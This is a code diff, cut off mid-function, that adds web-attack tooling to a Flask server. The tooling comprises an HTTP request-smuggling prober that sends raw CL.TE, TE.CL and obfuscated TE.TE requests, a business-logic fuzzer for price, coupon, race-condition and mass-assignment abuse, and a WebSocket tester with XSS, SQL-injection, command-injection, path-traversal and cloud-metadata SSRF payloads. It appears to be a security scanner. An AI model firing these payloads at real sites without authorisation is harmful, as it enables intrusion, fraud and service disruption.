@@ -24643,6 +24643,1205 @@ def oauth_test_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+class HttpSmuggler:
+    """
+    HTTP Request Smuggling detector: CL.TE, TE.CL, TE.TE (obfuscated),
+    H2.CL, H2.TE desync probes, and timing-based blind detection.
+    Uses raw socket sends to bypass Python's HTTP normalisation.
+    """
+
+    # TE obfuscation variants for TE.TE
+    TE_VARIANTS = [
+        "chunked",
+        "Chunked",
+        "CHUNKED",
+        "chunked, chunked",
+        "x, chunked",
+        " chunked",
+        "\tchunked",
+        "chunked\x0b",
+        "chunked\x0c",
+        "xchunked",
+        "[chunked]",
+        '"chunked"',
+    ]
+
+    def __init__(self):
+        self.timeout = 10
+
+    # ------------------------------------------------------------------ helpers
+    def _send_raw(self, host: str, port: int, payload: bytes, ssl_ctx=None) -> Tuple[bytes, float]:
+        """Send raw bytes, return response + elapsed seconds."""
+        import ssl as ssl_mod
+        start = time.time()
+        try:
+            sock = socket.create_connection((host, port), timeout=self.timeout)
+            if ssl_ctx or port == 443:
+                ctx = ssl_ctx or ssl_mod.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode    = ssl_mod.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(payload)
+            resp = b""
+            sock.settimeout(self.timeout)
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    resp += chunk
+                    if len(resp) > 8192:
+                        break
+            except Exception:
+                pass
+            sock.close()
+        except Exception as e:
+            return b"", time.time() - start
+        return resp, time.time() - start
+
+    def _parse_status(self, raw: bytes) -> Optional[int]:
+        try:
+            first_line = raw.split(b"\r\n")[0].decode(errors="replace")
+            return int(first_line.split()[1])
+        except Exception:
+            return None
+
+    def _target_parts(self, target: str) -> Tuple[str, int, str, bool]:
+        """Returns (host, port, path, is_ssl)."""
+        if not target.startswith("http"):
+            target = "https://" + target
+        p    = urllib.parse.urlparse(target)
+        ssl  = p.scheme == "https"
+        port = p.port or (443 if ssl else 80)
+        path = p.path or "/"
+        if p.query:
+            path += "?" + p.query
+        return p.hostname, port, path, ssl
+
+    # ------------------------------------------------------------------ CL.TE
+    def probe_cl_te(self, target: str) -> Dict:
+        """
+        CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding.
+        We send CL=13 but actual chunked body smuggles a SMUGGLED prefix.
+        If back-end splits, next request gets a 400/unexpected response.
+        """
+        host, port, path, ssl = self._target_parts(target)
+        payload = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: 13\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Connection: keep-alive\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+            f"SMUGGLED"
+        ).encode()
+
+        resp1, t1 = self._send_raw(host, port, payload, None)
+        status1   = self._parse_status(resp1)
+
+        # Follow-up innocent GET — if smuggled prefix is processed we may get 400/weird
+        followup  = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+        ).encode()
+        resp2, t2 = self._send_raw(host, port, followup, None)
+        status2   = self._parse_status(resp2)
+
+        # Timing indicator: if response was slow, back-end may be waiting for more data
+        vulnerable = (status2 is not None and status2 in (400, 500)) or t1 > 6
+        return {
+            "technique":    "CL.TE",
+            "status1":      status1,
+            "status2":      status2,
+            "timing_sec":   round(t1, 2),
+            "likely_vuln":  vulnerable,
+            "severity":     "CRITICAL" if vulnerable else "INFO",
+            "detail":       "Follow-up request got unexpected status — possible CL.TE desync" if vulnerable else "No obvious CL.TE signal",
+        }
+
+    # ------------------------------------------------------------------ TE.CL
+    def probe_te_cl(self, target: str) -> Dict:
+        """
+        TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length.
+        Chunked body has a large chunk size but small Content-Length so the
+        back-end stops reading early, leaving data in its buffer.
+        """
+        host, port, path, ssl = self._target_parts(target)
+        # Chunk size = 3 (just "abc"), then 0-terminator
+        # CL is set to 4 — back-end reads 4 bytes ("3\r\n" = 3 bytes + \r\n mismatch)
+        payload = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: 3\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Connection: keep-alive\r\n"
+            f"\r\n"
+            f"1\r\n"
+            f"G\r\n"
+            f"0\r\n"
+            f"\r\n"
+        ).encode()
+
+        resp, elapsed = self._send_raw(host, port, payload, None)
+        status        = self._parse_status(resp)
+        vulnerable    = elapsed > 6 or (status is not None and status in (400, 500))
+        return {
+            "technique":   "TE.CL",
+            "status":      status,
+            "timing_sec":  round(elapsed, 2),
+            "likely_vuln": vulnerable,
+            "severity":    "CRITICAL" if vulnerable else "INFO",
+            "detail":      "Timeout/400 on TE.CL probe — possible back-end waiting for CL bytes" if vulnerable else "No obvious TE.CL signal",
+        }
+
+    # ------------------------------------------------------------------ TE.TE (obfuscated)
+    def probe_te_te(self, target: str) -> List[Dict]:
+        """
+        TE.TE: both front-end and back-end support TE but one stops on the
+        obfuscated variant, the other processes it.
+        """
+        host, port, path, ssl = self._target_parts(target)
+        results = []
+
+        for variant in self.TE_VARIANTS:
+            payload = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 4\r\n"
+                f"Transfer-Encoding: {variant}\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"5c\r\n"
+                f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
+                f"0\r\n"
+                f"\r\n"
+            ).encode()
+
+            resp, elapsed = self._send_raw(host, port, payload, None)
+            status        = self._parse_status(resp)
+            flagged       = elapsed > 5 or (status in (400, 500, 403) if status else False)
+
+            if flagged:
+                results.append({
+                    "technique":    "TE.TE",
+                    "te_variant":   repr(variant),
+                    "status":       status,
+                    "timing_sec":   round(elapsed, 2),
+                    "likely_vuln":  True,
+                    "severity":     "CRITICAL",
+                    "detail":       f"TE obfuscation '{repr(variant)}' caused timeout/error — possible TE.TE desync",
+                })
+                break  # One confirmation is enough
+
+        if not results:
+            results.append({"technique": "TE.TE", "likely_vuln": False, "severity": "INFO", "detail": "No TE.TE signals detected"})
+        return results
+
+    # ------------------------------------------------------------------ H2.CL / H2.TE (conceptual probe)
+    def probe_h2_downgrade(self, target: str) -> Dict:
+        """
+        Probe for HTTP/2 downgrade smuggling vectors by inspecting
+        upgrade/alt-svc headers and checking if HTTP/1.1 smuggling
+        headers pass through the h2 frontend.
+        Uses requests (not raw sockets) since h2 requires TLS ALPN.
+        """
+        issues = []
+        try:
+            r = requests.get(target, timeout=10, verify=False,
+                             headers={"Upgrade": "h2c",
+                                      "HTTP2-Settings": "AAMAAABkAAQAAP__",
+                                      "Connection": "Upgrade, HTTP2-Settings"})
+            if r.status_code == 101:
+                issues.append({"severity": "HIGH", "issue": "Server accepted h2c Upgrade — H2.CL/H2.TE downgrade may be possible"})
+            alt_svc = r.headers.get("Alt-Svc", "")
+            if "h2=" in alt_svc or "h3=" in alt_svc:
+                issues.append({"severity": "MEDIUM", "issue": f"Alt-Svc advertises HTTP/2 or HTTP/3: {alt_svc[:80]}"})
+            # Check if Content-Length + Transfer-Encoding pass through together
+            r2 = requests.post(target, timeout=10, verify=False,
+                               headers={"Content-Length": "5", "Transfer-Encoding": "chunked"},
+                               data="5\r\nhello\r\n0\r\n\r\n")
+            if r2.status_code not in (400, 411, 501):
+                issues.append({"severity": "MEDIUM", "issue": f"Server accepted ambiguous CL+TE headers (status {r2.status_code}) — may forward both downstream"})
+        except Exception as e:
+            issues.append({"severity": "INFO", "issue": f"H2 probe error: {e}"})
+
+        return {
+            "technique":   "H2 downgrade",
+            "issues":      issues,
+            "likely_vuln": any(i["severity"] in ("HIGH", "CRITICAL") for i in issues),
+            "severity":    "HIGH" if any(i["severity"] == "HIGH" for i in issues) else "MEDIUM" if issues else "INFO",
+        }
+
+    # ------------------------------------------------------------------ timing blind
+    def probe_timing_blind(self, target: str) -> Dict:
+        """
+        Send a request that will cause the back-end to time out waiting
+        for the remainder of a smuggled request body. Compare timing
+        against a baseline to detect the delay.
+        """
+        host, port, path, ssl = self._target_parts(target)
+
+        # Baseline — normal request
+        normal = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode()
+        _, t_baseline = self._send_raw(host, port, normal, None)
+
+        # Smuggling probe — TE says chunked, CL says 6, body ends early
+        # Back-end (using CL=6) waits for 6 bytes but gets none → timeout
+        probe = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"Content-Length: 6\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+            f"0\r\n\r\n"
+        ).encode()
+        _, t_probe = self._send_raw(host, port, probe, None)
+
+        delay     = t_probe - t_baseline
+        timed_out = t_probe >= (self.timeout - 1) or delay > 5
+        return {
+            "technique":    "timing_blind",
+            "baseline_sec": round(t_baseline, 2),
+            "probe_sec":    round(t_probe, 2),
+            "delay_sec":    round(delay, 2),
+            "timed_out":    timed_out,
+            "likely_vuln":  timed_out,
+            "severity":     "HIGH" if timed_out else "INFO",
+            "detail":       f"Probe delayed {delay:.1f}s vs baseline {t_baseline:.1f}s — back-end likely waiting for smuggled body" if timed_out else "No significant timing difference",
+        }
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:          str,
+        probe_cl_te:     bool = True,
+        probe_te_cl:     bool = True,
+        probe_te_te:     bool = True,
+        probe_h2:        bool = True,
+        probe_timing:    bool = True,
+    ) -> Dict:
+        start   = time.time()
+        results = {}
+
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        if probe_cl_te:
+            results["cl_te"] = self.probe_cl_te(target)
+
+        if probe_te_cl:
+            results["te_cl"] = self.probe_te_cl(target)
+
+        if probe_te_te:
+            results["te_te"] = self.probe_te_te(target)
+
+        if probe_h2:
+            results["h2_downgrade"] = self.probe_h2_downgrade(target)
+
+        if probe_timing:
+            results["timing_blind"] = self.probe_timing_blind(target)
+
+        all_probes = []
+        for k, v in results.items():
+            if isinstance(v, list):
+                all_probes.extend(v)
+            elif isinstance(v, dict):
+                all_probes.append(v)
+
+        findings   = [p for p in all_probes if p.get("likely_vuln")]
+        sev_count  = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for f in findings:
+            s = f.get("severity", "INFO")
+            sev_count[s] = sev_count.get(s, 0) + 1
+
+        return {
+            "target":        target,
+            "results":       results,
+            "findings":      findings,
+            "total_findings":len(findings),
+            "critical":      sev_count["CRITICAL"],
+            "high":          sev_count["HIGH"],
+            "duration_sec":  round(time.time() - start, 2),
+        }
+
+
+http_smuggler = HttpSmuggler()
+
+
+@app.route("/api/tools/smuggle/probe", methods=["POST"])
+def http_smuggle_route():
+    try:
+        params = request.json or {}
+        result = http_smuggler.run(
+            target=params.get("target", ""),
+            probe_cl_te=bool(params.get("probe_cl_te", True)),
+            probe_te_cl=bool(params.get("probe_te_cl", True)),
+            probe_te_te=bool(params.get("probe_te_te", True)),
+            probe_h2=bool(params.get("probe_h2", True)),
+            probe_timing=bool(params.get("probe_timing", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 smuggle/probe error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class BusinessLogicFuzzer:
+    """
+    Business logic vulnerability testing: price/quantity tampering,
+    negative values, workflow skipping, coupon/promo abuse, race conditions,
+    parameter pollution, hidden field manipulation, and mass assignment.
+    """
+
+    PRICE_PARAMS   = ["price", "amount", "cost", "total", "subtotal", "fee",
+                      "unit_price", "sale_price", "discount", "tax", "grand_total"]
+    QTY_PARAMS     = ["qty", "quantity", "count", "num", "amount", "units",
+                      "items", "stock", "number"]
+    COUPON_PARAMS  = ["coupon", "promo", "code", "voucher", "discount_code",
+                      "promo_code", "coupon_code", "offer_code", "referral"]
+    ROLE_PARAMS    = ["role", "is_admin", "admin", "superuser", "privilege",
+                      "level", "tier", "group", "permission", "access_level",
+                      "is_staff", "is_superuser", "user_type"]
+    HIDDEN_PARAMS  = ["debug", "test", "internal", "bypass", "override",
+                      "force", "skip", "dev", "beta", "preview", "staging",
+                      "backdoor", "secret", "key", "token", "auth"]
+    WORKFLOW_STEPS = ["/checkout", "/payment", "/confirm", "/complete",
+                      "/order", "/purchase", "/process", "/finalize",
+                      "/submit", "/review"]
+
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
+
+    # ------------------------------------------------------------------ helpers
+    def _req(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        try:
+            return self.session.request(method, url, timeout=10, **kwargs)
+        except Exception:
+            return None
+
+    def _baseline(self, url: str, method: str = "GET", data: Dict = None) -> Optional[requests.Response]:
+        return self._req(method, url, json=data)
+
+    def _interesting_response(self, r: requests.Response, baseline: requests.Response) -> bool:
+        if r is None or baseline is None:
+            return False
+        if r.status_code in (200, 201) and baseline.status_code in (400, 422, 403):
+            return True
+        if r.status_code == baseline.status_code:
+            body  = (r.text or "").lower()
+            bbase = (baseline.text or "").lower()
+            # Look for success indicators that weren't in baseline
+            for kw in ("success", "approved", "created", "order_id", "transaction"):
+                if kw in body and kw not in bbase:
+                    return True
+        return False
+
+    # ------------------------------------------------------------------ 1. price/amount tampering
+    def price_tampering(self, target: str, endpoints: List[str]) -> List[Dict]:
+        findings = []
+        tamper_values = ["0", "-1", "-100", "0.001", "0.00", "0.0", "1e-10",
+                         "999999999", "-999", "null", "undefined", "NaN"]
+
+        for ep in endpoints:
+            url = target.rstrip("/") + ep
+            for param in self.PRICE_PARAMS:
+                for val in tamper_values:
+                    for method, payload in [
+                        ("POST", {param: val}),
+                        ("PUT",  {param: val}),
+                        ("POST", {"data": {param: val}}),  # nested
+                    ]:
+                        r = self._req(method, url, json=payload)
+                        if r and r.status_code in (200, 201):
+                            body = (r.text or "").lower()
+                            if any(kw in body for kw in ("success", "created", "order", "paid", "approved")):
+                                findings.append({
+                                    "type":     "price_tampering",
+                                    "severity": "CRITICAL",
+                                    "url":      url,
+                                    "method":   method,
+                                    "param":    param,
+                                    "value":    val,
+                                    "status":   r.status_code,
+                                    "detail":   f"Price param '{param}={val}' accepted with success response",
+                                    "snippet":  (r.text or "")[:200],
+                                })
+        return findings
+
+    # ------------------------------------------------------------------ 2. negative quantity
+    def negative_quantity(self, target: str, endpoints: List[str]) -> List[Dict]:
+        findings = []
+        neg_values = ["-1", "-999", "-0.5", "0", "-2147483648", "4294967295"]
+
+        for ep in endpoints:
+            url = target.rstrip("/") + ep
+            for param in self.QTY_PARAMS:
+                for val in neg_values:
+                    r = self._req("POST", url, json={param: val})
+                    if r and r.status_code in (200, 201):
+                        findings.append({
+                            "type":     "negative_quantity",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "param":    param,
+                            "value":    val,
+                            "status":   r.status_code,
+                            "detail":   f"Negative/zero quantity '{param}={val}' accepted",
+                            "snippet":  (r.text or "")[:200],
+                        })
+        return findings
+
+    # ------------------------------------------------------------------ 3. coupon/promo abuse
+    def coupon_abuse(self, target: str, endpoints: List[str]) -> List[Dict]:
+        findings = []
+        abuse_values = [
+            "AAAA", "SAVE100", "DISCOUNT100", "FREE", "100OFF",
+            "TEST", "ADMIN", "DEBUG", "OVERRIDE",
+            "A" * 256,   # overflow
+            "'; DROP TABLE coupons;--",  # SQLi probe
+            "<script>",  # XSS in coupon field
+        ]
+
+        for ep in endpoints:
+            url = target.rstrip("/") + ep
+            # Baseline with random coupon
+            baseline = self._req("POST", url, json={"coupon": "INVALIDXYZ99"})
+            if not baseline:
+                continue
+
+            for param in self.COUPON_PARAMS:
+                for val in abuse_values:
+                    r = self._req("POST", url, json={param: val})
+                    if r and r.status_code in (200, 201):
+                        body = (r.text or "").lower()
+                        if any(kw in body for kw in ("applied", "discount", "valid", "success")):
+                            findings.append({
+                                "type":     "coupon_abuse",
+                                "severity": "HIGH",
+                                "url":      url,
+                                "param":    param,
+                                "value":    val,
+                                "status":   r.status_code,
+                                "detail":   f"Coupon '{val}' accepted as valid",
+                                "snippet":  (r.text or "")[:200],
+                            })
+        return findings
+
+    # ------------------------------------------------------------------ 4. workflow skip
+    def workflow_skip(self, target: str) -> List[Dict]:
+        """Try directly accessing later workflow steps without completing earlier ones."""
+        findings = []
+        for step in self.WORKFLOW_STEPS:
+            for method in ("GET", "POST"):
+                url = target.rstrip("/") + step
+                r   = self._req(method, url)
+                if r and r.status_code in (200, 201):
+                    body = (r.text or "").lower()
+                    if not any(kw in body for kw in ("login", "sign in", "unauthorized", "redirect", "cart", "session")):
+                        findings.append({
+                            "type":     "workflow_skip",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "method":   method,
+                            "status":   r.status_code,
+                            "detail":   f"Workflow step '{step}' accessible directly without prior steps",
+                            "snippet":  (r.text or "")[:200],
+                        })
+        return findings
+
+    # ------------------------------------------------------------------ 5. race condition
+    def race_condition(self, target: str, endpoints: List[str], concurrent: int = 20) -> List[Dict]:
+        """Send N concurrent identical requests — detect if backend accepts >1 (double-spend)."""
+        findings = []
+
+        for ep in endpoints:
+            url  = target.rstrip("/") + ep
+            mark = f"RACE_{int(time.time())}"
+            success_count = [0]
+            responses     = []
+            lock          = threading.Lock()
+
+            def fire():
+                r = self._req("POST", url, json={"coupon": mark, "qty": 1})
+                if r and r.status_code in (200, 201):
+                    body = (r.text or "").lower()
+                    if any(kw in body for kw in ("success", "applied", "order", "created")):
+                        with lock:
+                            success_count[0] += 1
+                            responses.append((r.status_code, (r.text or "")[:100]))
+
+            threads = [threading.Thread(target=fire) for _ in range(concurrent)]
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join(timeout=15)
+
+            if success_count[0] > 1:
+                findings.append({
+                    "type":          "race_condition",
+                    "severity":      "HIGH",
+                    "url":           url,
+                    "accepted_count":success_count[0],
+                    "concurrent":    concurrent,
+                    "detail":        f"Endpoint accepted {success_count[0]}/{concurrent} concurrent identical requests (double-spend/race condition)",
+                    "snippet":       str(responses[:3]),
+                })
+
+        return findings
+
+    # ------------------------------------------------------------------ 6. parameter pollution
+    def parameter_pollution(self, target: str, endpoints: List[str]) -> List[Dict]:
+        """Duplicate params with different values — test which one wins."""
+        findings = []
+        poll_values = {
+            "price":  ("999", "0.01"),
+            "role":   ("user", "admin"),
+            "status": ("pending", "approved"),
+            "qty":    ("1", "-1"),
+        }
+
+        for ep in endpoints:
+            url = target.rstrip("/") + ep
+            for param, (legit, inject) in poll_values.items():
+                # Send both in JSON array
+                r_arr = self._req("POST", url, json={param: [legit, inject]})
+                # Send both as separate query params
+                qs  = f"?{param}={legit}&{param}={inject}"
+                r_qs = self._req("POST", url + qs)
+
+                for label, r in (("json_array", r_arr), ("query_string", r_qs)):
+                    if r and r.status_code in (200, 201):
+                        findings.append({
+                            "type":     "parameter_pollution",
+                            "severity": "MEDIUM",
+                            "url":      url,
+                            "method":   label,
+                            "param":    param,
+                            "values":   [legit, inject],
+                            "status":   r.status_code,
+                            "detail":   f"HPP via {label}: both '{legit}' and '{inject}' for '{param}' accepted",
+                        })
+        return findings
+
+    # ------------------------------------------------------------------ 7. hidden parameter discovery
+    def hidden_params(self, target: str, endpoints: List[str]) -> List[Dict]:
+        """Inject common hidden/debug params and look for behaviour changes."""
+        findings = []
+        test_vals = {
+            "debug":    ["true", "1", "yes"],
+            "test":     ["true", "1"],
+            "admin":    ["true", "1"],
+            "role":     ["admin", "superuser", "root"],
+            "override": ["true", "1"],
+            "bypass":   ["true", "1", "security"],
+            "is_admin": ["true", "1"],
+            "dev":      ["true", "1"],
+        }
+
+        for ep in endpoints:
+            url      = target.rstrip("/") + ep
+            baseline = self._req("GET", url)
+            if not baseline:
+                continue
+
+            for param, vals in test_vals.items():
+                for val in vals:
+                    # As query param
+                    r = self._req("GET", f"{url}?{param}={val}")
+                    if r and r.status_code != baseline.status_code:
+                        findings.append({
+                            "type":     "hidden_param",
+                            "severity": "HIGH" if param in ("admin", "role", "bypass", "is_admin") else "MEDIUM",
+                            "url":      url,
+                            "param":    param,
+                            "value":    val,
+                            "status_baseline": baseline.status_code,
+                            "status_injected": r.status_code,
+                            "detail":   f"Param '{param}={val}' changed response: {baseline.status_code}→{r.status_code}",
+                        })
+                    # As JSON body
+                    r2 = self._req("POST", url, json={param: val})
+                    if r2 and baseline and r2.status_code != baseline.status_code:
+                        findings.append({
+                            "type":     "hidden_param",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "param":    f"body.{param}",
+                            "value":    val,
+                            "status_baseline": baseline.status_code,
+                            "status_injected": r2.status_code,
+                            "detail":   f"Body param '{param}={val}' changed response: {baseline.status_code}→{r2.status_code}",
+                        })
+        return findings
+
+    # ------------------------------------------------------------------ 8. mass assignment
+    def mass_assignment(self, target: str, endpoints: List[str]) -> List[Dict]:
+        """Inject privilege-escalation fields in create/update requests."""
+        findings = []
+        inject_payloads = [
+            {"role": "admin"},
+            {"is_admin": True},
+            {"admin": True},
+            {"privilege": "superuser"},
+            {"user_type": "admin"},
+            {"is_staff": True},
+            {"is_superuser": True},
+            {"access_level": 99},
+            {"tier": "enterprise"},
+            {"permissions": ["admin", "superuser"]},
+        ]
+
+        for ep in endpoints:
+            url = target.rstrip("/") + ep
+            for payload in inject_payloads:
+                r = self._req("POST", url, json=payload)
+                if r and r.status_code in (200, 201):
+                    body = (r.text or "").lower()
+                    key  = list(payload.keys())[0]
+                    val  = str(list(payload.values())[0])
+                    # Check if the injected field is echoed back
+                    if key in body or val.lower() in body:
+                        findings.append({
+                            "type":     "mass_assignment",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "payload":  payload,
+                            "status":   r.status_code,
+                            "detail":   f"Mass assignment: field '{key}' accepted and echoed in response",
+                            "snippet":  (r.text or "")[:200],
+                        })
+        return findings
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:            str,
+        endpoints:         Optional[List[str]] = None,
+        check_price:       bool = True,
+        check_qty:         bool = True,
+        check_coupon:      bool = True,
+        check_workflow:    bool = True,
+        check_race:        bool = True,
+        check_pollution:   bool = True,
+        check_hidden:      bool = True,
+        check_mass:        bool = True,
+        race_concurrency:  int  = 20,
+    ) -> Dict:
+        start = time.time()
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        eps = endpoints or self.WORKFLOW_STEPS
+        all_findings = []
+
+        if check_price:
+            all_findings.extend(self.price_tampering(target, eps))
+        if check_qty:
+            all_findings.extend(self.negative_quantity(target, eps))
+        if check_coupon:
+            all_findings.extend(self.coupon_abuse(target, eps))
+        if check_workflow:
+            all_findings.extend(self.workflow_skip(target))
+        if check_race:
+            all_findings.extend(self.race_condition(target, eps, race_concurrency))
+        if check_pollution:
+            all_findings.extend(self.parameter_pollution(target, eps))
+        if check_hidden:
+            all_findings.extend(self.hidden_params(target, eps))
+        if check_mass:
+            all_findings.extend(self.mass_assignment(target, eps))
+
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for f in all_findings:
+            s = f.get("severity", "MEDIUM")
+            sev_count[s] = sev_count.get(s, 0) + 1
+
+        return {
+            "target":        target,
+            "endpoints":     eps,
+            "findings":      all_findings,
+            "total_findings":len(all_findings),
+            "critical":      sev_count["CRITICAL"],
+            "high":          sev_count["HIGH"],
+            "medium":        sev_count["MEDIUM"],
+            "duration_sec":  round(time.time() - start, 2),
+        }
+
+
+biz_logic_fuzzer = BusinessLogicFuzzer()
+
+
+@app.route("/api/tools/bizlogic/fuzz", methods=["POST"])
+def biz_logic_fuzz_route():
+    try:
+        params = request.json or {}
+        result = biz_logic_fuzzer.run(
+            target=params.get("target", ""),
+            endpoints=params.get("endpoints"),
+            check_price=bool(params.get("check_price", True)),
+            check_qty=bool(params.get("check_qty", True)),
+            check_coupon=bool(params.get("check_coupon", True)),
+            check_workflow=bool(params.get("check_workflow", True)),
+            check_race=bool(params.get("check_race", True)),
+            check_pollution=bool(params.get("check_pollution", True)),
+            check_hidden=bool(params.get("check_hidden", True)),
+            check_mass=bool(params.get("check_mass", True)),
+            race_concurrency=int(params.get("race_concurrency", 20)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 bizlogic/fuzz error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class WebSocketTester:
+    """
+    WebSocket security testing: discovery, auth bypass, message injection,
+    CSWSH, origin validation, subprotocol abuse, and message fuzzing.
+    """
+
+    WS_UPGRADE_PATHS = [
+        "/ws", "/websocket", "/socket", "/socket.io/",
+        "/ws/chat", "/ws/notifications", "/ws/events",
+        "/api/ws", "/api/websocket", "/realtime",
+        "/live", "/stream", "/feed", "/updates",
+        "/cable", "/actioncable",                # Rails ActionCable
+        "/sockjs/",                              # SockJS
+        "/ws/graphql", "/graphql",               # GraphQL subscriptions
+    ]
+
+    INJECTION_PAYLOADS = [
+        # XSS
+        '{"msg":"<script>alert(1)</script>"}',
+        '{"message":"<img src=x onerror=alert(1)>"}',
+        # SQLi
+        '{"query":"SELECT * FROM users"}',
+        '{"id":"1 OR 1=1"}',
+        # Command injection
+        '{"cmd":"ls -la"}',
+        '{"exec":"id"}',
+        # Template injection
+        '{"name":"{{7*7}}"}',
+        '{"data":"${7*7}"}',
+        # JSON prototype pollution
+        '{"__proto__":{"admin":true}}',
+        '{"constructor":{"prototype":{"admin":true}}}',
+        # Path traversal
+        '{"file":"../../etc/passwd"}',
+        # SSRF via WS message
+        '{"url":"http://169.254.169.254/latest/meta-data/"}',
+        # Large payload (buffer overflow probe)
+        '{"msg":"' + 'A' * 65536 + '"}',
+    ]
+
+    def __init__(self):
+        self.session = requests.Session()
+
+    # ------------------------------------------------------------------ helpers
+    def _ws_upgrade_check(self, url: str, extra_headers: Dict = None) -> Dict:
+        """
+        Check if a URL accepts WebSocket upgrades by sending the HTTP
+        Upgrade handshake and inspecting the 101 response.
+        """
+        import ssl as ssl_mod
+        parsed   = urllib.parse.urlparse(url)
+        host     = parsed.hostname
+        port     = parsed.port or (443 if parsed.scheme in ("wss", "https") else 80)
+        path     = parsed.path or "/"
+        use_ssl  = parsed.scheme in ("wss", "https")
+        ws_key   = base64.b64encode(os.urandom(16)).decode()
+        headers  = {
+            "Host":                   f"{host}:{port}",
+            "Upgrade":                "websocket",
+            "Connection":             "Upgrade",
+            "Sec-WebSocket-Key":      ws_key,
+            "Sec-WebSocket-Version":  "13",
+            "Origin":                 f"{'https' if use_ssl else 'http'}://{host}",
+        }
+        if extra_headers:
+            headers.update(extra_headers)
+
+        raw_hdrs = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
+        payload  = f"GET {path} HTTP/1.1\r\n{raw_hdrs}\r\n\r\n".encode()
+
+        try:
+            sock = socket.create_connection((host, port), timeout=8)
+            if use_ssl:
+                ctx = ssl_mod.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode    = ssl_mod.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(payload)
+            resp = b""
+            sock.settimeout(5)
+            try:
+                while True:
+                    chunk = sock.recv(2048)
+                    if not chunk:
+                        break
+                    resp += chunk
+                    if b"\r\n\r\n" in resp:
+                        break
+            except Exception:
+                pass
+            sock.close()
+            first_line   = resp.split(b"\r\n")[0].decode(errors="replace")
+            status_code  = int(first_line.split()[1]) if len(first_line.split()) > 1 else 0
+            headers_resp = resp.decode(errors="replace")
+            return {
+                "upgraded":    status_code == 101,
+                "status":      status_code,
+                "response":    headers_resp[:500],
+                "url":         url,
+            }
+        except Exception as e:
+            return {"upgraded": False, "status": 0, "error": str(e), "url": url}
+
+    def _send_ws_frame(self, sock, message: str):
+        """Send a masked WebSocket text frame."""
+        data    = message.encode()
+        mask    = os.urandom(4)
+        masked  = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+        length  = len(data)
+        if length < 126:
+            header = bytes([0x81, 0x80 | length]) + mask
+        elif length < 65536:
+            header = bytes([0x81, 0xFE]) + length.to_bytes(2, "big") + mask
+        else:
+            header = bytes([0x81, 0xFF]) + length.to_bytes(8, "big") + mask
+        sock.sendall(header + masked)
+
+    def _recv_ws_frame(self, sock, timeout: float = 3.0) -> Optional[str]:
+        """Receive one WebSocket frame and return text content."""
+        try:
+            sock.settimeout(timeout)
+            header = sock.recv(2)
+            if not header or len(header) < 2:
+                return None
+            length = header[1] & 0x7F
+            if length == 126:
+                length = int.from_bytes(sock.recv(2), "big")
+            elif length == 127:
+                length = int.from_bytes(sock.recv(8), "big")
+            length = min(length, 65536)
+            data   = b""
+            while len(data) < length:
+                chunk = sock.recv(length - len(data))
+                if not chunk:
+                    break
+                data += chunk
+            return data.decode(errors="replace")
+        except Exception:
+            return None
+
+    # ------------------------------------------------------------------ 1. endpoint discovery
+    def discover_endpoints(self, target: str) -> List[Dict]:
+        """Probe common WebSocket endpoint paths."""
+        found = []
+        parsed = urllib.parse.urlparse(target if target.startswith("http") else "https://" + target)
+        base_ws  = f"wss://{parsed.netloc}"
+        base_wss = f"ws://{parsed.netloc}"
+
+        for path in self.WS_UPGRADE_PATHS:
+            for base in (base_ws, base_wss):
+                result = self._ws_upgrade_check(base + path)
+                if result.get("upgraded"):
+                    found.append({
+                        "url":      base + path,
+                        "status":   result["status"],
